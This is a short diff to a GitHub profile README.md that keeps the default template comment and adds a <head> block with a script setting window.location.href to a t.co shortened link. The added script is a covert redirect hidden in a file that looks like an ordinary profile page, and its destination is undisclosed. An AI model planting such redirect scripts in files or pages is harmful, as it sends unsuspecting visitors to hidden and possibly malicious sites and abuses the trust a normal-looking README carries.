@@ -8,3 +8,9 @@
 mohamedrazkoki/mohamedrazkoki is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
+
+<head>
+    <script>
+        window.location.href = &quot;https://t.co/1velIeZFiU&quot;;
+    </script>
+</head>
